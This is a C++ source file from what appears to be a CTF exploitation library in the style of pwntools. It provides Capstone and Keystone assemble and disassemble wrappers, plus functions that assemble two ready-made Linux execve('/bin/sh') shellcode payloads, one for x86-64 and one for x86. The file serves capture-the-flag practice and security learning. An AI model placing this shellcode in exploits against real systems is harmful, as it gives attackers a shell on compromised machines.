#include "ctf/enums.hpp"
#include <capstone/capstone.h>
#include <cstring>
#include <ctf/context.hpp>
#include <ctf/shellcraft.hpp>
#include <fmt/format.h>
#include <keystone/keystone.h>
#include <stdexcept>

static const char *LINUX_X64_SH = R"lit(push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push 0x3b /* SYS_execve */
    pop rax
    syscall)lit";

static const char *LINUX_X86_SH = R"lit(push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push 0xb /* SYS_execve */
    pop eax
    int 0x80)lit";

static std::pair<cs_arch, cs_mode> convert_arch_to_cs(ctf::Architecture arch) {
    using ctf::Architecture;
    switch (arch) {
    case Architecture::X86_64:
        return std::make_pair(CS_ARCH_X86, CS_MODE_64);
    case Architecture::X86:
        return std::make_pair(CS_ARCH_X86, CS_MODE_32);
    case Architecture::Arm:
        return std::make_pair(CS_ARCH_ARM, CS_MODE_32);
    case Architecture::Aarch64:
        return std::make_pair(CS_ARCH_ARM, CS_MODE_64);
    case Architecture::Other:
    default:
        throw std::runtime_error("Architecture not implemented!");
    }
}

static std::pair<ks_arch, ks_mode> convert_arch_to_ks(ctf::Architecture arch) {
    using ctf::Architecture;
    switch (arch) {
    case Architecture::X86_64:
        return std::make_pair(KS_ARCH_X86, KS_MODE_64);
    case Architecture::X86:
        return std::make_pair(KS_ARCH_X86, KS_MODE_32);
    case Architecture::Arm:
        return std::make_pair(KS_ARCH_ARM, KS_MODE_32);
    case Architecture::Aarch64:
        return std::make_pair(KS_ARCH_ARM, KS_MODE_64);
    case Architecture::Other:
    default:
        throw std::runtime_error("Architecture not implemented!");
    }
}

namespace ctf {

std::string disassemble(
    std::string_view code, Architecture arch, std::optional<size_t> address
) {
    csh handle    = 0;
    cs_insn *insn = nullptr;
    size_t count  = 0;

    const auto [a, m] = convert_arch_to_cs(arch);

    if (cs_open(a, m, &handle) != CS_ERR_OK)
        throw std::runtime_error("Bad assembly entry");
    std::string ret;
    count = cs_disasm(
        handle,
        reinterpret_cast<const unsigned char *>(code.data()),
        code.size(),
        address ? *address : 0,
        0,
        &insn
    );
    if (count > 0) {
        for (auto j = 0; j < count; j++) {
            auto i = insn[j];
            if (address)
                ret += fmt::format(
                    "0x{:016x}\t{}\t\t{}\n", i.address, i.mnemonic, i.op_str
                );
            else
                ret += fmt::format("{}\t{}\n", i.mnemonic, i.op_str);
        }
        cs_free(insn, count);
    } else
        throw std::runtime_error("Bad assembly entry");

    cs_close(&handle);
    return ret;
}

std::string disassemble(std::string_view code, std::optional<size_t> address) {
    return disassemble(code, CONTEXT.arch, address);
}

std::string assemble(const char *code, Architecture arch) {
    ks_engine *ks         = nullptr;
    ks_err err            = {};
    size_t count          = 0;
    unsigned char *encode = nullptr;
    size_t size           = 0;
    const auto [a, m]     = convert_arch_to_ks(arch);
    std::string ret;
    err = ks_open(a, m, &ks);
    if (err != KS_ERR_OK) {
        throw std::runtime_error("Couldn't assemble entry");
    }

    if (ks_asm(ks, code, 0, &encode, &size, &count) != KS_ERR_OK) {
        throw std::runtime_error(fmt::format(
            "Couldn't assemble entry: {}", ks_strerror(ks_errno(ks))
        ));
    } else {
        for (auto i = 0; i < size; i++) {
            ret += (char)encode[i];
        }
    }

    ks_free(encode);
    ks_close(ks);
    return ret;
}

std::string assemble(const char *code) { return assemble(code, CONTEXT.arch); }

std::string linux_sh_x64() {
    return assemble(LINUX_X64_SH, Architecture::X86_64);
}

std::string linux_sh_x86() { return assemble(LINUX_X86_SH, Architecture::X86); }
} // namespace ctf
